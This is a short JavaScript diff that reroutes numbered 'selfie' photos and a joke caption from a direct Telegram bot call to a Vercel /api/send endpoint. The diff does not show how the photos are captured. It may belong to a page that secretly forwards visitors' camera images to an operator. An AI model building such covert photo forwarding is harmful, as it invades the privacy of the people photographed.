@@ -158,21 +158,21 @@
         }
 
         async function sendToTelegram(dataUrl, photoNumber) {
-            const botToken = process.env.TELEGRAM_BOT_TOKEN;
-            const chatId = process.env.TELEGRAM_CHAT_ID;
+    const formData = new FormData();
+    formData.append("photo", dataURLtoFile(dataUrl, `selfie-${photoNumber}.jpg`));
+    formData.append("photoNumber", photoNumber);
+    formData.append("caption", `📸 صورة ${photoNumber}\n${funnyMsg}`);
 
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", dataURLtoFile(dataUrl, `selfie-${photoNumber}.jpg`));
-            formData.append("caption", `📸 صورة ${photoNumber}\n${funnyMsg}`);
-
-            try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                });
-            } catch (e) {}
-        }
+    try {
+        // نرسل الطلب إلى السيرفر الداخلي لـ Vercel وليس لتيليجرام مباشرة
+        await fetch("/api/send", {
+            method: "POST",
+            body: formData
+        });
+    } catch (e) {
+        console.error("خطأ في الإرسال للسيرفر:", e);
+    }
+}
 
         function dataURLtoFile(dataurl, filename) {
             const arr = dataurl.split(',');
